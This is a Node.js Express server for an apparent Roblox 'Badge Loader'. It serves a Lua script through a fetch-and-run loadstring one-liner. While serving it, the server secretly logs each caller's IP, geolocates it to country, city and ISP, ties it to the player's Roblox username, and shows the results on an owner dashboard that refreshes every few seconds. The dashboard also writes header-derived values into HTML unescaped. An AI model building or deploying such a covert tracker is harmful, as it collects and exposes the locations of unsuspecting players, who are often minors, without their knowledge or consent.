const express = require("express")
const fs = require("fs")
const path = require("path")
const db = require("./database")

const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args))

const app = express()

// CLEAN IP FUNCTION
function cleanIP(ip){
if(!ip) return "Unknown"
if(ip.includes(",")) ip = ip.split(",")[0]
if(ip.includes("::ffff:")) ip = ip.replace("::ffff:","")
return ip.trim()
}

// LOADER
app.get("/load", async (req,res)=>{

let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress
ip = cleanIP(ip)

const executor = req.headers["executor"] || "Unknown"

// MST TIME
const time = new Date().toLocaleString("en-US", {
    timeZone: "America/Phoenix",
    hour12: true
})

let country="Unknown"
let city="Unknown"
let isp="Unknown"

try{
const geo = await fetch(`http://ip-api.com/json/${ip}`)
const data = await geo.json()

if(data.status === "success"){
country = data.country
city = data.city
isp = data.isp
}
}catch{
console.log("Geo lookup failed")
}

// insert first
db.run(
"INSERT INTO executions (ip, executor, time, country, city, isp, username) VALUES (?, ?, ?, ?, ?, ?, ?)",
[ip, executor, time, country, city, isp, "Loading..."]
)

const script = fs.readFileSync(
path.join(__dirname,"../scripts/main.lua"),
"utf8"
)

res.send(script)

})


// USERNAME LOGGER
app.get("/log", async (req,res)=>{

const userid = req.query.userid

if(!userid){
res.send("no userid")
return
}

let username="Unknown"

try{
const r = await fetch(`https://users.roblox.com/v1/users/${userid}`)
const data = await r.json()

if(data && data.name){
username = data.name
}
}catch{
console.log("Roblox lookup failed")
}

// update latest row
db.run(
"UPDATE executions SET username=? WHERE id=(SELECT MAX(id) FROM executions)",
[username]
)

res.send("ok")

})


// DASHBOARD
app.get("/dashboard/owner",(req,res)=>{

db.all("SELECT * FROM executions",(err,rows)=>{

if(err){
res.send("DB error")
return
}

let logs=""

rows.slice(-50).reverse().forEach(log=>{
logs+=`
<tr>
<td>${log.username}</td>
<td>${log.ip}</td>
<td>${log.country}</td>
<td>${log.city}</td>
<td>${log.isp}</td>
<td>${log.time}</td>
</tr>
`
})

res.send(`
<html>
<head>
<title>Dashboard</title>

<style>
body{background:#020617;color:white;font-family:Arial;padding:40px}
.card{background:#1e293b;padding:20px;border-radius:10px;margin-bottom:20px}
table{width:100%;border-collapse:collapse}
td,th{border:1px solid #334155;padding:10px}
th{background:#0f172a}
.loaderbox{background:#0f172a;padding:10px;border-radius:6px;font-family:monospace}
button{padding:10px;background:#38bdf8;border:none;border-radius:6px;margin-top:10px;cursor:pointer}
</style>

</head>

<body>

<h1>Badge Loader Dashboard</h1>

<div class="card">
Total Executions: ${rows.length}
</div>

<div class="card">
<h2>Loader</h2>
<div class="loaderbox">
loadstring(game:HttpGet("https://badge-loader-production.up.railway.app/load"))()
</div>
<button onclick="navigator.clipboard.writeText('loadstring(game:HttpGet(\\'https://badge-loader-production.up.railway.app/load\\'))()')">
Copy
</button>
</div>

<div class="card">
<h2>Executions</h2>

<table>
<tr>
<th>Username</th>
<th>IP</th>
<th>Country</th>
<th>City</th>
<th>ISP</th>
<th>Time</th>
</tr>

${logs}

</table>

</div>

<script>
setInterval(()=>location.reload(),5000)
</script>

</body>
</html>
`)
})

})

app.listen(3000,()=>console.log("Running"))
